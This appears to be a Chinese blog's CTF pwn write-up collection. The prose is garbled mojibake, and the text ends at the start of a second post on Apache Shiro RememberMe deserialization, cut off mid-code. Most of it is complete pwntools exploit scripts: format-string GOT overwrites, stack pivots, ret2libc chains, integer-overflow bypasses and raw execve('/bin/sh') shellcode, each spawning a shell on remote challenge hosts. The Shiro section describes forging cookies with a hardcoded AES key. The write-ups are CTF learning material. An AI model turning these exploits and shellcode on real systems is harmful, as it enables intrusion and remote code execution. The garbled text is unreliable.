libc.dump('str_bin_sh')io.sendlineafter(&quot;choice!\\n&quot;, '1')payload1 = padding + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;encrypted\\n&quot;, payload1)io.interactive() è¿™é¢˜é‡Œé¢é‚£ä¸ªå¾ªç¯åŠ å¯†å¥½åƒä¹Ÿä¸ç”¨ç»•è¿‡ï¼Œæˆ‘ç›´æ¥æ‰“ä¹Ÿèƒ½é€š [æ·±è‚²æ¯ 2021]find_flagä¿æŠ¤å…¨å¼€ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²leakå‡ºcanaryå’Œç¨‹åºåŸºå€ å¯ä»¥ç®—å‡ºåç§»æ˜¯6ï¼Œè¿™æ ·æˆ‘ä»¬å†æ‰¾å‡ºcanaryå’Œpie æœ‰äº†åœ°å€ï¼Œç”¨vmmapæŸ¥çœ‹åŸºåœ°å€ç®—å‡ºåç§»æ˜¯0x1140 IDAä¸­å¯ä»¥å‘ç°æ­£å¥½æœ‰ä¸€ä¸ªæ¼æ´å‡½æ•°ï¼Œç›´æ¥åˆ©ç”¨å³å¯ exp from pwn import *#io = process('./find_flag')io = remote('1.14.71.254',28056)context.log_level = 'debug'fmt = b&quot;aa%17$pbb%16$p&quot;io.recvuntil(&quot;name?&quot;)io.sendline(fmt)io.recvuntil(&quot;aa&quot;)canary = int(io.recv(18), 16)log.info(hex(canary))io.recvuntil(&quot;bb&quot;)addr_base = int(io.recv(14), 16) - 0x1140log.info(hex(addr_base))sub_1228 = 0x1228flag = addr_base + sub_1228payload = b'a' * (0x40 - 0x8) + p64(canary) + b'b' * 0x8 + p64(flag)io.sendlineafter(&quot;else? &quot;, payload)io.interactive() NSSå¹³å°ä¸Šç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œè¿œç¨‹å’Œæœ¬åœ°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥leak pieé‚£é‡Œæ˜¯%16$p,harukiå¸ˆå‚…æ•™æˆ‘ç›´æ¥%p*20æ•°å‡ºæ¥ğŸŒ¶ï¸ CGfsbformat string exp from pwn import *io = remote('111.200.241.244', 60496)pwnme = 0x0804A068offset = 10io.sendlineafter('please tell me your name:', b'kkkk')#payload = p32(pwnme) + b&quot;bbbb%10$n&quot;payload = fmtstr_payload(offset, {pwnme:0x8})io.sendlineafter('leave your message please:', payload)io.interactive() greetingexp from pwn import *elf = ELF('./greeting')io = remote('111.200.241.244', 50819)fini_arr = 0x08049934main = 0x080485EDstrlen_got = 0x08049A54system_plt = 0x08048490payload = b'k' * 2 # 2payload += p32(strlen_got+2)payload += p32(fini_arr+2)payload += p32(strlen_got)payload += p32(fini_arr)#16pad_len = len(&quot;Nice to meet you, &quot;) #18payload += b&quot;%&quot; + str(0x0804 - 0x24) + &quot;c%12$hn%13$hn&quot;payload += b&quot;%&quot; + str(0x8490 - 0x0804) + &quot;c%14$hn&quot;payload += b&quot;%&quot; + str(0x85ED - 0x8490) + &quot;c%15$hn&quot;io.sendlineafter(&quot;Please tell me your name... &quot;, payload)io.recvuntil(&quot;Please tell me your name... &quot;)io.sendline('/bin/sh\\x00')io.interactive() å®æ—¶æ•°æ®ç›‘æµ‹å¯ä»¥ç›´æ¥è¦†ç›–ï¼Œä¹Ÿå¯ä»¥åŒå­—èŠ‚è¦†ç›– exp from pwn import *io = remote('111.200.241.244', 54060)#io = process('./mon')context.log_level = 'debug'key_bss = 0x0804A048offset = 12#payload = fmtstr_payload(offset, {key_bss:0x02223322})payload = p32(key_bss+2) + p32(key_bss)payload += &quot;%&quot; + str(0x0222 - 8) + &quot;c%12$hn&quot;payload += &quot;%&quot; + str(0x3322 - 0x0222) + &quot;c%13$hn&quot;io.sendline(payload)io.interactive() [CISCN 2019è¥¿å—]PWN1exp from pwn import *io = remote('1.14.71.254', 28030)elf = ELF('./ciscn_2019_sw_pwn1')main = 0x08048534fini_addr = 0x0804979Cprintf_got = elf.got['printf']system_plt = 0x080483d0payload = p32(printf_got + 2) + p32(fini_addr + 2) + p32(printf_got) + p32(fini_addr)payload += &quot;%&quot; + str(0x0804 - 16) + &quot;c%4$hn%5$hn&quot;payload += &quot;%&quot; + str(0x83d0 - 0x0804) + &quot;c%6$hn&quot;payload += &quot;%&quot; + str(0x8534 - 0x83d0) + &quot;c%7$hn&quot;io.sendlineafter('name?', payload)io.recvuntil(&quot;name?&quot;)io.sendline('/bin/sh\\x00')io.interactive() [Black Watch å…¥ç¾¤é¢˜]PWNç»å…¸çš„æ ˆè¿ç§» exp from pwn import *io = remote('node4.buuoj.cn', 28396)elf = ELF('./spwn')#io = process('./spwn')libc = ELF('./libc-2.23_32.so')#libc = ELF('/lib/i386-linux-gnu/libc.so.6')context.log_level = 'debug'write_plt = elf.plt['write']write_got = elf.got['write']main = elf.sym['main']s = 0x0804A300leave_ret = 0x08048408io.recvuntil('name?')payload0 = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)io.sendline(payload0)io.recvuntil('say?')payload1 = b'a' * 0x18 + p32(s - 4) + p32(leave_ret)#ä¸èƒ½ç”¨sendlineï¼Œå¤šä¸€ä¸ª\\nåœ¨ç¼“å†²åŒºå†…io.send(payload1)write_addr = u32(io.recv(4))log.info(hex(write_addr))libc_base = write_addr - libc.symbols['write']system = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))io.recvuntil('name?')payload2 = p32(system) + p32(0) + p32(bin_sh)io.sendline(payload2)io.recvuntil('say?')io.sendline(payload1)io.interactive() [CISCN 2019ä¸œå—]PWN2exp é‚£ä¸¤ä¸ªebpçš„åç§»è®¡ç®— https://blog.csdn.net/Y_peak/article/details/113823280 æµ‹è¯•exp from pwn import *io = process('./ciscn_2019_es_pwn2')#io = remote('1.14.71.254', 28096)system = 0x08048400leave_ret = 0x080484b8payload = b'a' * 0x27 + b'k'io.recvuntil('name?\\n')io.send(payload)io.recvuntil('k')ebp_addr = u32(io.recv(4))log.info(hex(ebp_addr))payload1 = (b'bkdr' + p32(system) + p32(0xdeadbeef) + b'shdr' + b'/bin/sh\\x00').ljust(0x28, b'\\x00')raw_input('debug:')io.sendline(payload1) io.interactive() from pwn import *#io = process('./ciscn_2019_es_pwn2')io = remote('1.14.71.254', 28096)system = 0x08048400leave_ret = 0x080484b8payload = b'a' * 0x27 + b'k'io.recvuntil('name?\\n')#è¿™é‡Œä¸èƒ½ç”¨sendlineï¼Œå¤šä¸€ä¸ª\\nï¼Œå¤šä¸€ä¸ªå­—èŠ‚æ¥æ”¶åˆ°çš„åœ°å€æ˜¯é”™çš„io.send(payload)io.recvuntil('k')ebp_addr = u32(io.recv(4))log.info(hex(ebp_addr))payload1 = (b'k' * 4 + p32(system) + p32(0xdeadbeef) + p32(ebp_addr - 0x28) + b&quot;/bin/sh\\x00&quot;).ljust(0x28, b'\\x00')payload1 += p32(ebp_addr-0x38) + p32(leave_ret)io.sendline(payload1)io.interactive() format2è¿™é¢˜å‡½æ•°è›®å¤šï¼Œä½†æ˜¯ä¹Ÿå°±ä¸»è¦åˆ†æé‚£å‡ ä¸ª é¦–å…ˆçœ‹ä¸»å‡½æ•°ï¼Œè¾“å…¥çš„è¢«è§£å¯†åæ”¾åœ¨v6ï¼Œv6çš„é•¿åº¦ä¸èƒ½è¶…è¿‡0xc ,ä¹Ÿå°±æ˜¯æˆ‘ä»¬payloadæœ€å¤§é•¿åº¦æ˜¯12 æ¼æ´ç‚¹åœ¨authå‡½æ•°è¿™é‡Œï¼Œçœ‹åˆ°memcpyï¼Œåœ¨v4å¤„å°±æœ‰4ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–åˆ°authå‡½æ•°ebpå¤„çš„å†…å®¹ï¼Œè€Œebpå¤„å­˜çš„å°±æ˜¯ä¹‹å‰mainå‡½æ•°çš„ebpï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„åœ°å€ï¼Œè¿›è€Œmainé€€å‡ºæ—¶æ‰§è¡Œleaveï¼Œmov esp,ebp,espçš„å€¼å°±æŒ‡å‘æˆ‘ä»¬åˆ©ç”¨çš„åœ°å€ï¼ŒåŠ«æŒäº†ç¨‹åºæ‰§è¡Œæµç¨‹ å¯ä»¥å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ–‡ç« å›¾è§£ https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request_id%22%3A%22164229926316780265467309%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=164229926316780265467309&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&amp;utm_term=format2&amp;spm=1018.2226.3001.4187 exp from pwn import *import base64#io = process('./format2')io = remote('111.200.241.244', 57858)bin_sh = 0x08049284input = 0x0811EB40payload = base64.b64encode(b'a' * 4 + p32(bin_sh) + p32(input))io.recvuntil('Authenticate : ')io.sendline(payload)io.interactive() [mssctf2021]signinè¥¿ç”µä¸¾åŠçš„ä¸­å­¦ç”ŸCTFç«èµ› æ”¾ä¸€ä¸‹å¤ç°åœ°å€https://ctf.xidian.edu.cn/challenges è¿™é¢˜ä¸»è¦è€ƒæ ˆæº¢å‡º+æ•´æ•°æº¢å‡ºï¼Œå¯ä»¥çœ‹åˆ°v6æ˜¯ä¸€ä¸ªunsigned int8èŒƒå›´æ˜¯0-255,å°±å¯ä»¥æ ¹æ®è¿™ä¸ªç»•è¿‡ifåˆ¤æ–­ï¼Œç„¶åé€šè¿‡mainçš„readè¯»å…¥åŠstrcpyè¦†ç›–signinçš„v5è¿”å›åˆ°åé—¨å‡½æ•°çš„åœ°å€ exp from pwn import *#io = process('./signin')io = remote('pwn.archive.xdsec.chall.frankli.site' ,10006)system_addr = 0x080492B6payload = b'ZXFxaWUmY29yMWU=' + b'a' * (0x89 + 4 - 16) + p32(system_addr) + b'b' * 140io.sendline(payload)io.interactive() [mssctf2021]shellcodeå› ä¸ºæœ‰ä¸ªcall rdiæ‰€ä»¥IDAæ— æ³•è¿›è¡Œåæ±‡ç¼–ï¼Œéœ€è¦å—¯çœ‹æ±‡ç¼– å°±æ˜¯å¾€bufé‡Œè¯»å…¥0x3cä¸ªå­—èŠ‚ï¼Œå†å°†bufè½½åˆ°raxé‡Œï¼Œå†ç»™bufçš„æŒ‡é’ˆåŠ 0xaä¸ªå­—èŠ‚ï¼Œæ”¾åˆ°rdié‡Œï¼Œå†call rdiï¼Œå› ä¸ºæ²¡æœ‰å¼€NXä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå¡«å…¥0xaä¸ªé•¿åº¦çš„paddingï¼Œå†å¾€bufé‡Œå†™å…¥shellcodeå°±å¯ä»¥ exp from pwn import *#è¦æŒ‡å®šå¥½æ¶æ„æ˜¯64ä½çš„context.arch = 'amd64'p = remote('pwn.archive.xdsec.chall.frankli.site' ,10022)shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;payload = b'a'*10 + shellcodep.sendline(payload)p.interactive() int_overflowæ”»é˜²ä¸–ç•Œçš„ä¸€é“æ•´æ•°æº¢å‡ºçš„ç»ƒä¹ é¢˜ æ¼æ´ç‚¹å°±åœ¨è¿™ä¸ªcheck_passwdå‡½æ•°é‡Œçš„ä¸€ä¸ªå˜é‡å­˜å‚¨æ–¹é¢ è¿™é‡Œçš„v3æ˜¯unsigned int8ç±»å‹ï¼Œå°±ç›¸å½“äºä¸€ä¸ªæ— ç¬¦å·char å‹èŒƒå›´åœ¨0-255ï¼Œè€Œtaæ¥å—çš„æ˜¯ä¸€ä¸ªsize_tç±»å‹(unsigned int)çš„æ•°æ®ï¼Œä»è€Œé€ æˆæ— ç¬¦å·æ•°çš„å›ç»• exp from pwn import *io = remote('111.200.241.244',49854)flag = 0x0804868Bio.sendlineafter('choice:', str(1))io.sendlineafter('username:', b'kkkk')payload = b'a' * 0x14 + b'b' * 0x4 + p32(flag) + 232 * b'a'io.sendlineafter('passwd:', payload)io.interactive() wustctf2020_number_gameä¹Ÿæ˜¯ä¸€é“æ•´æ•°æº¢å‡ºçš„é¢˜ç›® ç¨‹åºå¾ˆç®€å•ï¼Œå°±ä¸€ä¸ªå–è´Ÿæ•°åˆ¤æ–­ï¼Œç»•è¿‡åˆ¤æ–­å°±ç›´æ¥getshell v1æ˜¯ä¸€ä¸ª32ä½çš„intç±»å‹å˜é‡ï¼ŒèŒƒå›´åœ¨-2147483648~-2147483647ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå°ä¸-2147483648çš„æ•°å°±å¯ä»¥äº† exp from pwn import *io = remote('node4.buuoj.cn',26318)payload = str(-2147483649)io.sendline(payload)io.interactive() stringç¨‹åºå¾ˆé•¿ï¼Œçœ‹æ•…äº‹ï¼Œä½†æ˜¯å¹¶ä¸å¤æ‚ï¼Œéœ€è¦ç‚¹è€å¿ƒå»åˆ†æï¼Œè€ƒç‚¹è¿˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ è¿™ä¸ªå‡½æ•°é‡Œæ˜æ˜¾çœ‹åˆ°æ¼æ´ç‚¹ å†çœ‹åˆ°è¿™ä¸ªå‡½æ•°å¯ä»¥å‘ç°getshellçš„ç‚¹ åªè¦å°†ä¼ å…¥çš„æŒ‡é’ˆå˜é‡a1çš„å€¼ï¼Œä¿®æ”¹ä¸ºå’Œ*(a+1)ç›¸åŒçš„å€¼ï¼Œå†æ‰§è¡Œshellcode é¡ºä¾¿æ³¨æ„ä¸‹ï¼Œç®—åç§»è¦æ³¨æ„æ˜¯32ä½è¿˜æ˜¯64ä½ï¼Œä¸¤ç§ä¼ å‚ä¸ä¸€æ ·ï¼Œæœ€å¥½ç”¨gdbç®— exp from pwn import *#io = process('./string')context.arch = 'amd64'io = remote('111.200.241.244', 52695)io.recvuntil('secret[0] is ')key = int(io.recvuntil('\\n'), 16)log.info(hex(key))io.sendlineafter('What should your character\\'s name be:', b'lnk')io.sendlineafter('So, where you will go?east or up?:', b'east')io.sendlineafter('go into there(1), or leave(0)?:', str(1))io.sendlineafter(&quot;'Give me an address'&quot;, str(key))#64ä½ä¼ å‚è°ƒç”¨å˜äº†,å¼€å§‹æ•°å‡ºæ¥æ˜¯%8$payload = b&quot;%85c%7$n&quot;io.sendlineafter('And, you wish is:', payload)shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;io.sendlineafter('Wizard: I will help you! USE YOU SPELL\\n', shellcode)io.interactive() [mssctf2021 Finals]SignInç­¾åˆ°é¢˜å§ï¼Œè·Ÿç€æç¤ºå»æ³¨å†Œç™»å½•æ‹¿flagï¼Œè€ƒpwntoolsçš„äº¤äº’ä½¿ç”¨ exp from pwn import *io = remote('pwn.archive.xdsec.chall.frankli.site', 10093)#io = process('./signin')io.sendlineafter('Your choice:', b'1')io.sendlineafter('Please input your UserName:', b'lnk')io.recvuntil('Here\\'s your key: \\n')key = io.recvline()log.info(f&quot;key is: {key}&quot;)io.sendlineafter('Your choice:', b'2')io.sendlineafter('User name:', b'lnk')io.sendlineafter('Password:', key)io.sendlineafter('Your choice:', b'3')io.recvuntil('Here\\'s your key: ')flag = io.recvline()io.sendlineafter('Tell me your key:', flag)io.interactive() [mssctf2021 Finals]shellcodeå’Œåˆèµ›å·®ä¸å¤šä¸€æ ·çš„é¢˜ï¼Œæ³¨æ„shellcodeçš„é•¿åº¦ï¼Œä¸èƒ½è¶…è¿‡30 exp from pwn import *context.arch = 'amd64'#p = remote('pwn.archive.xdsec.chall.frankli.site' ,10022)p = process('./shellcode')shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;print(len(shellcode))payload = shellcodep.recvuntil('Tell me what to do:\\n')p.sendline(payload)p.interactive() gyctf_2020_borrowstackä¸€é“æ ˆè¿ç§»çš„é¢˜ï¼Œä¸”bssæ®µå’Œgotçš„åœ°å€ç›¸è·è¾ƒè¿‘ï¼Œéœ€è¦åˆ©ç”¨retæŠ¬é«˜æ ˆå¸§ï¼Œä¸ç„¶æ‰§è¡ŒROPçš„æ—¶å€™ä¼šä¿®æ”¹gotè¡¨ä¸­çš„å€¼ï¼Œå¯¼è‡´æ³„æ¼çš„åœ°å€ä¸å¯¹ã€‚ exp from pwn import *io = remote('node4.buuoj.cn',29764)#context.log_level = 'debug'elf = ELF('./borrowstack')libc = ELF('./libc-2.23.so')puts_got = elf.got['puts']puts_plt = elf.plt['puts']main = elf.symbols['main']bank_addr = 0x0000000000601080pop_rdi_ret = 0x0000000000400703leave_ret = 0x0000000000400699ret = 0x00000000004004c9payload = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)io.sendafter('ï¼·elcome to Stack bank,Tell me what you want', payload)io.recvuntil('Done!You can check and use your borrow stack now!')payload = p64(ret) * 20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.send(payload)io.recvline()puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))log.info(hex(puts_addr))libc_base = puts_addr - libc.symbols['puts']shell = libc_base + 0x4526apayload = b'a' * 0x60 + p64(0xdeadbeef) + p64(shell)io.send(payload)io.recvuntil('ï¼·elcome to Stack bank,Tell me what you want\\nDone!You can check and use your borrow stack now!')io.send(str(1))io.interactive() [SWPU 2019]loginæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨bssæ®µçš„åˆ©ç”¨ï¼Œå¯¹è¿™ä¸ªç‚¹ä¸ç†Ÿæ‚‰çš„è¯å¯ä»¥å…ˆå»åšåšHITCONâ€”Traning LAB 9 é‚£é“ä¾‹é¢˜ï¼Œè¿™ä¸¤é¢˜å·®ä¸å¤š exp from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']elf = ELF('./SWPUCTF_2019_login')io = process('./SWPUCTF_2019_login')#io = remote('1.14.71.254', 28044)#io = remote('node4.buuoj.cn', 27316)libc = elf.libc#libc = ELF('./libc-2.27_32.so')sl = lambda s : io.sendline(s)sa = lambda s, payload : io.sendlineafter(s,payload)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))printf_got = elf.got['printf']ms(&quot;printf_got&quot;, printf_got)name = &quot;lnk&quot;sa(&quot;Please input your name:&quot;,name)ru(&quot;Please input your password:&quot;)payload = 'aaaa%6$p'sl(payload)ru(&quot;aaaa&quot;)ru(&quot;0x&quot;)ebp_content = int(rv(8), 16)#change = (int(io.recvline()[2:10],16)-4)&amp;0xff#ms(&quot;change&quot;,change)change = (ebp_content - 0x4) &amp; 0xffms(&quot;stack&quot;, ebp_content)ms(&quot;change&quot;, change)payload1 = &quot;%&quot; + str(change) + &quot;c%6$hhn&quot;ru(&quot;Try again!&quot;)sl(payload1)payload2 = &quot;%&quot; + str(0x14) + &quot;c%10$hhn&quot;ru(&quot;Try again!&quot;)sl(payload2)#raw_input('&gt;')# modify againpayload3 = &quot;%&quot; + str(change - 0x4) + &quot;c%6$hhn&quot;ru(&quot;Try again!&quot;)sl(payload3)payload4 = &quot;%&quot; + str(0xb016) + &quot;c%10$hn&quot;ru(&quot;Try again!&quot;)sl(payload4)#raw_input('&gt;')#debug(0x80485af,0)# leak printf address to get system addressru(&quot;Try again!&quot;)leak_printf = &quot;bbbb%9$s&quot;sl(leak_printf)ru('bbbb')printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)libc_base = printf_addr - libc.symbols['printf']ms(&quot;libc_base&quot;, libc_base)system_addr = libc_base + libc.symbols['system']ms(&quot;pt_libc&quot;, libc.symbols['printf'])ms('sys_libc', libc.symbols['system'])ms(&quot;system_addr&quot;, system_addr)syslow = system_addr &amp; 0xffffsyshigh = system_addr &gt;&gt; 16payload5 = &quot;%&quot; + str(syslow) + &quot;c%9$hn&quot;payload5 += &quot;%&quot; + str(syshigh - syslow) + &quot;c%8$hn&quot;ru(&quot;Try again!&quot;)sl(payload5)ru(&quot;Try again!&quot;)sl(&quot;/bin/sh&quot;)io.interactive() bbctf_2020_fmt_mesnprintfé€ æˆçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸€å¼€å§‹æ²¡æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œåæ¥ç»è¿‡æé†’æ‰æƒ³åˆ°æ”¹å†™gotè¡¨ï¼Œï¼ˆæˆ‘æ˜¯ğŸ¥¬ğŸ”å‘œå‘œå‘œ é¦–å…ˆç¨‹åºæ‰§è¡Œä¸€æ¬¡å°±é€€å‡ºäº†ï¼Œä¸èƒ½å¾ªç¯åˆ©ç”¨ï¼Œæˆ‘ä»¬å…ˆæ”¹system@gotä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œè¾¾åˆ°æ— é™å¾ªç¯çš„ç›®çš„ payload1 = fmtstr_payload(6, {system_got:main_addr}, write_size='long') åç§»æ˜¯6æ˜¯å› ä¸ºsnprintfä»å³åˆ°å·¦ä¼ å‚ï¼Œè¦å‡å»å¦å¤–ä¸¤ä¸ªå‚æ•°ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åƒä¸‹å›¾è¿™æ ·æ•°å‡ºæ¥ æ¥ä¸‹æ¥æ”¹å†™atoiå‡½æ•°çš„gotä¸ºsystemå‡½æ•°çš„è£…è½½åœ°å€ä¹Ÿå°±æ˜¯system@plt+6ï¼Œæœ€åä¼ å…¥/bin/shå°±å¯ä»¥getshell exp from pwn import *#io = process('./bbctf_2020_fmt_me')io = remote('node4.buuoj.cn',27747)elf = ELF('./bbctf_2020_fmt_me')context.log_level = 'debug'context.arch = 'amd64'system_got = elf.got['system']print('sys_got--&gt;', hex(system_got))main_addr = elf.sym['main']print('main--&gt;', hex(main_addr))atoi_got = elf.got['atoi']io.recvuntil('Choice: ')io.sendline(str(2))payload1 = fmtstr_payload(6, {system_got:main_addr}, write_size='long')#raw_input('&gt;')io.sendlineafter('Good job. I\\'ll give you a gift.', payload1)payload2 = fmtstr_payload(6, {atoi_got:0x00401056}, write_size='long')io.recvuntil('Choice: ')io.sendline(str(2))io.sendlineafter('Good job. I\\'ll give you a gift.', payload2)io.recv()io.sendline(b'/bin/sh')io.interactive()","link":"/2021/12/11/prc_pwn/"},{"title":"shiroååºåˆ—åŒ–åˆ†æ(ä¸€)","text":"å‰è¨€æœ€è¿‘è¿™æ®µæ—¶é—´å¿ƒæƒ…å¤ªç³Ÿç³•äº†ï¼Œæœ‰ç‚¹å‹æŠ‘ï¼Œè¿˜æ˜¯å¾—è°ƒæ•´ä¸€ä¸‹å§ï¼Œä¸èƒ½è¿™ä¹ˆeä¸‹å» ç¯å¢ƒæ­å»ºè¿™é‡Œé‡‡ç”¨pç‰›æ­å¥½çš„ç¯å¢ƒ è®¿é—®http://localhost:8081/shirodemo/login.jsp æ¼æ´åˆ†ææ¼æ´åŸç†Apache Shiroæ¡†æ¶æä¾›äº†RememberMeçš„åŠŸèƒ½ï¼Œç”¨æˆ·ç™»é™†æˆåŠŸåä¼šç”Ÿæˆç»è¿‡AESåŠ å¯†å¹¶base64çš„cookieï¼Œä¼ åˆ°æœåŠ¡å™¨ç«¯åä¼šç»è¿‡Base64è§£ç â€“&gt;AESè§£å¯†â€“&gt;ååºåˆ—åŒ–ï¼ŒAESæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†çš„ç®—æ³•ï¼Œåªè¦æˆ‘ä»¬è·å¾—äº†KEYï¼Œå°±èƒ½å¤Ÿæ„é€ æ¶æ„çš„å¯¹è±¡åŠ å¯†å¹¶ç¼–ç ï¼Œä¼ åˆ°cookieä¸Šè®©å…¶è¿›è¡Œååºåˆ—åŒ–æ‰§è¡Œæ¶æ„ä»£ç  åŠ å¯†è¿‡ç¨‹é¦–å…ˆå…¥å£ç‚¹åœ¨onSuccessfulLoginè¿™ä¸ªæ–¹æ³• æ–­åœ¨è¿™ä¸¤å¤„ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜¯å¦é€‰æ‹©äº†remembermeå­—æ®µï¼Œé€‰æ‹©äº†ï¼Œå°±å¾€ä¸‹èµ°ï¼Œå…¶ä¸­tokenä¿å­˜äº†ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚ç»§ç»­è·Ÿè¿›åˆ°rememberIdentityæ–¹æ³•ï¼Œå†ç›´æ¥è¿›åˆ°this.rememberIdentity(subject, principals) è¿™é‡Œæœ‰ä¸ªconvertPrincipalsToBytesçœ‹æ„æ€åº”è¯¥å°±æ˜¯å°†è®¤è¯ä¿¡æ¯è½¬ä¸ºå­—èŠ‚ protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { byte[] bytes = serialize(principals); if (getCipherService() != null) { bytes = encrypt(bytes); } return bytes; } å°†principalsåºåˆ—åŒ–ï¼Œç„¶åè°ƒgetCipherService()ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯ä¼šè¿”å›ä¸€ä¸ªåŠ å¯†æ¨¡å¼ å›åˆ°ä¹‹å‰ï¼Œé€šè¿‡ifåï¼Œç›´æ¥encryptå»åŠ å¯†bytes protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey()); value = byteSource.getBytes(); } return value; } è¿™é‡ŒåŒæ ·ä¹Ÿæ˜¯å…ˆè·å¾—åŠ å¯†æ–¹æ³•ï¼Œç„¶åå°†ä¼ å…¥çš„byteså’ŒgetEncryptionCipherKey()ä¸€èµ·æ‰”è¿›åŠ å¯†å‡½æ•° å…¶ä¸­é‚£ä¸ªkeyæ˜¯ç¡¬ç¼–ç å†™å¥½çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾€å›æ‰¾å‘ç°å®ƒæ˜¯ä¸€ä¸ªå¸¸é‡å€¼ è¿™é‡Œæˆ‘ä»¬å°±è·å¾—äº†è¿™ä¸ªå…³é”®çš„å¯†é’¥ ç„¶åå°±æ˜¯ç»è¿‡åŠ å¯†ç®—æ³•ï¼Œè¿”å›åŠ å¯†åçš„ç»“æœï¼Œå…·ä½“å¯†ç å­¦éƒ¨åˆ†æˆ‘ä»¬å°±ä¸åˆ†æäº†ï¼ˆğŸ‘´çœ‹ä¸æ‡‚ ç„¶åå›åˆ°ä¸‹ä¸€æ­¥çš„rememberSerializedIdentity protected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { if (log.isDebugEnabled()) { String msg = &quot;Subject argument is not an HTTP-aware instance. This is required to obtain a servlet &quot; + &quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot; + &quot;ignoring rememberMe operation.&quot;; log.debug(msg); } return; } HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); //base 64 encode it and store as a cookie: String base64 = Base64.encodeToString(serialized); Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); } å…·ä½“çœ‹ä¸‹é¢ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°±è®¾ç½®åˆ°Cookieä¸­å»ï¼Œè€Œnameå°±æ˜¯rememberme è¿™å°±æ˜¯å…·ä½“çš„åŠ å¯†æµç¨‹ è§£å¯†è¿‡ç¨‹é€šè¿‡æœç´¢CookieRememberMeå…³é”®å­—æ‰¾åˆ°è¿™ä¸ªç±»CookieRememberMeManagerï¼Œç„¶åé”å®šåˆ°è¿™ä¸ªæ–¹æ³•getRememberedSerializedIdentity protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { if (log.isDebugEnabled()) { String msg = &quot;SubjectContext argument is not an HTTP-aware instance. This is required to obtain a &quot; + &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; + &quot;immediately and ignoring rememberMe operation.&quot;; log.debug(msg); } return null; } WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) { return null; } HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) { base64 = ensurePadding(base64); if (log.isTraceEnabled()) { log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + 